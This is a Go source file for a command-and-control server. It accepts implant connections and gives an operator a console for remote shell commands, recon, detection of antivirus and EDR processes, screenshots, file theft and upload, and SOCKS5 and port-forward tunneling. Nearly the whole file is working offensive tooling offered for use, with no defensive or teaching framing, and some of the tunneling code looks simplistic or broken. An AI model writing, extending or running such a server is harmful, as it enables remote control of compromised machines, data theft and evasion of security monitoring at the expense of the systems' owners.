package main

import (
	"bufio"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	MSG_COMMAND  = "cmd"
	MSG_RESPONSE = "resp"
	MSG_UPLOAD   = "upload"
	MSG_DOWNLOAD = "download"
	MSG_FILE     = "file"
	MSG_ERROR    = "error"
)

// TLS cert/key — replace placeholders with output of:
// openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"
const tlsCert = `-----BEGIN CERTIFICATE-----
PLACEHOLDER - REPLACE WITH REAL CERT
-----END CERTIFICATE-----`

const tlsKey = `-----BEGIN RSA PRIVATE KEY-----
PLACEHOLDER - REPLACE WITH REAL KEY
-----END RSA PRIVATE KEY-----`

type Message struct {
	Type    string `json:"type"`
	Payload string `json:"payload"`
	Data    []byte `json:"data,omitempty"`
}

type Session struct {
	ID          int
	Conn        net.Conn
	RemoteIP    string
	ConnectedAt time.Time
}

var (
	sessions       = make(map[int]*Session)
	sessionMu      sync.Mutex
	sessionCounter int
	activeSession  *Session
	logFile        *os.File
)

func sendMsg(conn net.Conn, msg Message) error {
	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	length := make([]byte, 4)
	binary.BigEndian.PutUint32(length, uint32(len(data)))
	conn.Write(length)
	_, err = conn.Write(data)
	return err
}

func recvMsg(conn net.Conn) (Message, error) {
	lenBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lenBuf); err != nil {
		return Message{}, err
	}
	size := binary.BigEndian.Uint32(lenBuf)
	buf := make([]byte, size)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return Message{}, err
	}
	var msg Message
	err := json.Unmarshal(buf, &msg)
	return msg, err
}

func logOutput(sessionID int, direction, content string) {
	if logFile == nil {
		return
	}
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	fmt.Fprintf(logFile, "[%s] [Session %d] [%s]\n%s\n%s\n",
		timestamp, sessionID, direction, content, strings.Repeat("-", 60))
}

func registerSession(conn net.Conn) *Session {
	sessionMu.Lock()
	defer sessionMu.Unlock()
	sessionCounter++
	s := &Session{
		ID:          sessionCounter,
		Conn:        conn,
		RemoteIP:    conn.RemoteAddr().String(),
		ConnectedAt: time.Now(),
	}
	sessions[sessionCounter] = s
	return s
}

func removeSession(id int) {
	sessionMu.Lock()
	defer sessionMu.Unlock()
	delete(sessions, id)
	if activeSession != nil && activeSession.ID == id {
		activeSession = nil
	}
}

func listSessions() {
	sessionMu.Lock()
	defer sessionMu.Unlock()
	if len(sessions) == 0 {
		fmt.Println("[*] No active sessions")
		return
	}
	fmt.Println()
	fmt.Printf("  %-5s %-25s %-20s\n", "ID", "REMOTE ADDR", "CONNECTED AT")
	fmt.Println("  " + strings.Repeat("-", 55))
	for id, s := range sessions {
		active := " "
		if activeSession != nil && activeSession.ID == id {
			active = "*"
		}
		fmt.Printf("%s %-5d %-25s %-20s\n", active,
			s.ID, s.RemoteIP, s.ConnectedAt.Format("2006-01-02 15:04:05"))
	}
	fmt.Println()
}

func handleSession(s *Session) {
	defer func() {
		removeSession(s.ID)
		s.Conn.Close()
		fmt.Printf("\n[!] Session %d lost (%s)\n", s.ID, s.RemoteIP)
		fmt.Print("c2> ")
	}()

	reader := bufio.NewReader(os.Stdin)

	for {
		prompt := fmt.Sprintf("\nc2 [%d]> ", s.ID)
		fmt.Print(prompt)
		line, _ := reader.ReadString('\n')
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		cmd := parts[0]
		logOutput(s.ID, "CMD", line)

		switch cmd {
		case "help":
			printHelp()
		case "background", "bg":
			fmt.Printf("[*] Backgrounding session %d\n", s.ID)
			return
		case "exit", "quit":
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "exit"})
			fmt.Printf("[*] Session %d closed\n", s.ID)
			return
		case "run":
			if len(parts) < 2 {
				fmt.Println("[!] Usage: run <command>")
				continue
			}
			shellCmd := strings.TrimPrefix(line, "run ")
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "run " + shellCmd})
			resp, err := recvMsg(s.Conn)
			if err != nil {
				fmt.Println("[!] Lost connection:", err)
				return
			}
			fmt.Print(resp.Payload)
			logOutput(s.ID, "OUT", resp.Payload)
		case "ls", "dir":
			path := "."
			if len(parts) > 1 {
				path = strings.Join(parts[1:], " ")
			}
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "ls " + path})
			resp, err := recvMsg(s.Conn)
			if err != nil {
				fmt.Println("[!] Lost connection:", err)
				return
			}
			fmt.Print(resp.Payload)
			logOutput(s.ID, "OUT", resp.Payload)
		case "ps":
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "ps"})
			resp, err := recvMsg(s.Conn)
			if err != nil {
				fmt.Println("[!] Lost connection:", err)
				return
			}
			fmt.Print(resp.Payload)
			logOutput(s.ID, "OUT", resp.Payload)
		case "netstat":
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "netstat"})
			resp, err := recvMsg(s.Conn)
			if err != nil {
				fmt.Println("[!] Lost connection:", err)
				return
			}
			fmt.Print(resp.Payload)
			logOutput(s.ID, "OUT", resp.Payload)
		case "sysinfo":
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "sysinfo"})
			resp, err := recvMsg(s.Conn)
			if err != nil {
				fmt.Println("[!] Lost connection:", err)
				return
			}
			fmt.Print(resp.Payload)
			logOutput(s.ID, "OUT", resp.Payload)
		case "whoami":
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "whoami"})
			resp, err := recvMsg(s.Conn)
			if err != nil {
				fmt.Println("[!] Lost connection:", err)
				return
			}
			fmt.Print(resp.Payload)
			logOutput(s.ID, "OUT", resp.Payload)
		case "arp":
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "arp"})
			resp, err := recvMsg(s.Conn)
			if err != nil {
				fmt.Println("[!] Lost connection:", err)
				return
			}
			fmt.Print(resp.Payload)
			logOutput(s.ID, "OUT", resp.Payload)
		case "getenv":
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "getenv"})
			resp, err := recvMsg(s.Conn)
			if err != nil {
				fmt.Println("[!] Lost connection:", err)
				return
			}
			fmt.Print(resp.Payload)
			logOutput(s.ID, "OUT", resp.Payload)
		case "checkav":
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "checkav"})
			resp, err := recvMsg(s.Conn)
			if err != nil {
				fmt.Println("[!] Lost connection:", err)
				return
			}
			fmt.Print(resp.Payload)
			logOutput(s.ID, "OUT", resp.Payload)
		case "screenshot":
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "screenshot"})
			resp, err := recvMsg(s.Conn)
			if err != nil {
				fmt.Println("[!] Lost connection:", err)
				return
			}
			if resp.Type == MSG_ERROR {
				fmt.Println("[!]", resp.Payload)
				continue
			}
			fname := fmt.Sprintf("screenshot_%d_%s.png", s.ID, time.Now().Format("20060102_150405"))
			os.WriteFile(fname, resp.Data, 0644)
			fmt.Printf("[+] Screenshot saved: %s (%d bytes)\n", fname, len(resp.Data))
		case "shell":
			fmt.Println("[*] Entering interactive shell. Type 'exit' to return.")
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "shell"})
			interactiveShell(s)
		case "download":
			if len(parts) < 2 {
				fmt.Println("[!] Usage: download <remote_path> [local_path]")
				continue
			}
			remotePath := parts[1]
			localPath := remotePath
			if len(parts) >= 3 {
				localPath = parts[2]
			}
			sendMsg(s.Conn, Message{Type: MSG_DOWNLOAD, Payload: remotePath})
			resp, err := recvMsg(s.Conn)
			if err != nil {
				fmt.Println("[!] Lost connection:", err)
				return
			}
			if resp.Type == MSG_ERROR {
				fmt.Println("[!] Error:", resp.Payload)
				continue
			}
			os.WriteFile(localPath, resp.Data, 0644)
			fmt.Printf("[+] Downloaded %d bytes -> %s\n", len(resp.Data), localPath)
		case "upload":
			if len(parts) < 3 {
				fmt.Println("[!] Usage: upload <local_path> <remote_path>")
				continue
			}
			fileData, err := os.ReadFile(parts[1])
			if err != nil {
				fmt.Println("[!] Cannot read file:", err)
				continue
			}
			sendMsg(s.Conn, Message{Type: MSG_UPLOAD, Payload: parts[2], Data: fileData})
			resp, err := recvMsg(s.Conn)
			if err != nil {
				fmt.Println("[!] Lost connection:", err)
				return
			}
			fmt.Println(resp.Payload)
		case "socks":
			if len(parts) < 2 {
				fmt.Println("[!] Usage: socks <local_port>")
				continue
			}
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "socks"})
			go startSOCKS5(s.Conn, parts[1])
			fmt.Printf("[+] SOCKS5 proxy on 127.0.0.1:%s\n", parts[1])
		case "lportfwd":
			if len(parts) < 4 {
				fmt.Println("[!] Usage: lportfwd <local_port> <target_host> <target_port>")
				continue
			}
			go localPortForward(s.Conn, parts[1], parts[2], parts[3])
			fmt.Printf("[+] Forwarding 127.0.0.1:%s -> %s:%s\n", parts[1], parts[2], parts[3])
		case "rportfwd":
			if len(parts) < 4 {
				fmt.Println("[!] Usage: rportfwd <remote_port> <local_host> <local_port>")
				continue
			}
			payload := fmt.Sprintf("rportfwd %s|%s|%s", parts[1], parts[2], parts[3])
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: payload})
			resp, err := recvMsg(s.Conn)
			if err != nil {
				fmt.Println("[!] Lost connection:", err)
				return
			}
			fmt.Println(resp.Payload)
		default:
			fmt.Printf("[!] Unknown command: %s. Type 'help'.\n", cmd)
		}
	}
}

func interactiveShell(s *Session) {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("shell> ")
		line, _ := reader.ReadString('\n')
		line = strings.TrimSpace(line)
		if line == "exit" {
			sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "shellexit"})
			fmt.Println("[*] Returned to C2")
			return
		}
		sendMsg(s.Conn, Message{Type: MSG_COMMAND, Payload: "shellcmd " + line})
		resp, err := recvMsg(s.Conn)
		if err != nil {
			fmt.Println("[!] Shell lost connection")
			return
		}
		fmt.Print(resp.Payload)
	}
}

func startSOCKS5(controlConn net.Conn, localPort string) {
	listener, err := net.Listen("tcp", "127.0.0.1:"+localPort)
	if err != nil {
		fmt.Println("[!] SOCKS5 listen error:", err)
		return
	}
	defer listener.Close()
	for {
		client, err := listener.Accept()
		if err != nil {
			return
		}
		go handleSOCKS5Client(client, controlConn)
	}
}

func handleSOCKS5Client(client net.Conn, controlConn net.Conn) {
	defer client.Close()
	buf := make([]byte, 256)
	n, err := client.Read(buf)
	if err != nil || n < 2 || buf[0] != 0x05 {
		return
	}
	client.Write([]byte{0x05, 0x00})
	n, err = client.Read(buf)
	if err != nil || n < 7 || buf[1] != 0x01 {
		return
	}
	var targetHost string
	var targetPort uint16
	switch buf[3] {
	case 0x01:
		targetHost = fmt.Sprintf("%d.%d.%d.%d", buf[4], buf[5], buf[6], buf[7])
		targetPort = binary.BigEndian.Uint16(buf[8:10])
	case 0x03:
		dLen := int(buf[4])
		targetHost = string(buf[5 : 5+dLen])
		targetPort = binary.BigEndian.Uint16(buf[5+dLen : 7+dLen])
	default:
		return
	}
	target := fmt.Sprintf("%s:%d", targetHost, targetPort)
	sendMsg(controlConn, Message{Type: MSG_COMMAND, Payload: "sockstunnel " + target})
	resp, err := recvMsg(controlConn)
	if err != nil || resp.Type == MSG_ERROR {
		client.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	client.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
	go io.Copy(client, strings.NewReader(resp.Payload))
	io.Copy(io.Discard, client)
}

func localPortForward(controlConn net.Conn, lPort, rHost, rPort string) {
	listener, err := net.Listen("tcp", "127.0.0.1:"+lPort)
	if err != nil {
		fmt.Println("[!] Port forward listen error:", err)
		return
	}
	defer listener.Close()
	for {
		client, err := listener.Accept()
		if err != nil {
			return
		}
		go func(c net.Conn) {
			defer c.Close()
			target := rHost + ":" + rPort
			sendMsg(controlConn, Message{Type: MSG_COMMAND, Payload: "portfwd " + target})
			resp, err := recvMsg(controlConn)
			if err != nil || resp.Type == MSG_ERROR {
				return
			}
			go io.Copy(c, strings.NewReader(resp.Payload))
		}(client)
	}
}

func printHelp() {
	fmt.Println(`
╔════════════════════════════════════════════════════════════╗
║                    C2 Server Commands                      ║
╠════════════════════════════════════════════════════════════╣
║  SESSION MANAGEMENT                                        ║
║    sessions -l              List all sessions              ║
║    sessions -i <id>         Interact with session          ║
║    background / bg          Background current session     ║
║    exit                     Kill session & disconnect      ║
║  SHELL                                                     ║
║    run <cmd>                Run shell command              ║
║    shell                    Interactive shell mode         ║
║  RECON                                                     ║
║    sysinfo                  OS, hostname, user, arch       ║
║    whoami                   Current user + privileges      ║
║    ps                       Running process list           ║
║    netstat                  Active network connections     ║
║    arp                      ARP cache (host discovery)     ║
║    getenv                   Dump environment variables     ║
║    checkav                  Detect AV/EDR processes        ║
║    screenshot               Capture screen to PNG          ║
║  FILESYSTEM                                                ║
║    ls / dir <path>          Directory listing              ║
║  FILE TRANSFER                                             ║
║    download <rem> [local]   Pull file from client          ║
║    upload <local> <remote>  Push file to client            ║
║  TUNNELING                                                 ║
║    socks <port>             SOCKS5 proxy on local port     ║
║    lportfwd <lp> <rh> <rp> Local port forward             ║
║    rportfwd <rp> <lh> <lp> Remote port forward            ║
║    help                     Show this menu                 ║
╚════════════════════════════════════════════════════════════╝`)
}

func serverMenu(listener net.Listener) {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("\nc2> ")
		line, _ := reader.ReadString('\n')
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.Fields(line)
		switch parts[0] {
		case "sessions":
			if len(parts) < 2 {
				listSessions()
				continue
			}
			switch parts[1] {
			case "-l":
				listSessions()
			case "-i":
				if len(parts) < 3 {
					fmt.Println("[!] Usage: sessions -i <id>")
					continue
				}
				id := 0
				fmt.Sscanf(parts[2], "%d", &id)
				sessionMu.Lock()
				s, ok := sessions[id]
				sessionMu.Unlock()
				if !ok {
					fmt.Printf("[!] Session %d not found\n", id)
					continue
				}
				activeSession = s
				fmt.Printf("[*] Interacting with session %d (%s)\n", s.ID, s.RemoteIP)
				handleSession(s)
			default:
				fmt.Println("[!] Usage: sessions -l | sessions -i <id>")
			}
		case "help":
			printHelp()
		case "exit", "quit":
			fmt.Println("[*] Shutting down server")
			os.Exit(0)
		default:
			fmt.Printf("[!] Unknown command: %s\n", parts[0])
		}
	}
}

func main() {
	port    := flag.String("port", "4444", "Port to listen on")
	useTLS  := flag.Bool("tls", false, "Use TLS encryption")
	logPath := flag.String("log", "", "Log file path (e.g. session.log)")
	flag.Parse()

	if *logPath != "" {
		var err error
		logFile, err = os.OpenFile(*logPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println("[!] Could not open log file:", err)
		} else {
			fmt.Printf("[+] Logging to %s\n", *logPath)
			defer logFile.Close()
		}
	}

	fmt.Printf("[*] C2 Server starting on port %s", *port)
	if *useTLS {
		fmt.Print(" (TLS)")
	}
	fmt.Println()

	var listener net.Listener
	var err error

	if *useTLS {
		cert, err := tls.X509KeyPair([]byte(tlsCert), []byte(tlsKey))
		if err != nil {
			fmt.Println("[!] TLS cert error — run: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes")
			os.Exit(1)
		}
		cfg := &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		}
		listener, err = tls.Listen("tcp", ":"+*port, cfg)
	} else {
		listener, err = net.Listen("tcp", ":"+*port)
	}

	if err != nil {
		fmt.Println("[!] Listen error:", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Printf("[*] Waiting for connections on 0.0.0.0:%s\n", *port)
	fmt.Println("[*] Use 'sessions -l' to list, 'sessions -i <id>' to interact")

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				continue
			}
			s := registerSession(conn)
			fmt.Printf("\n[+] New session %d from %s\n", s.ID, s.RemoteIP)
			fmt.Print("c2> ")
		}
	}()

	serverMenu(listener)
}
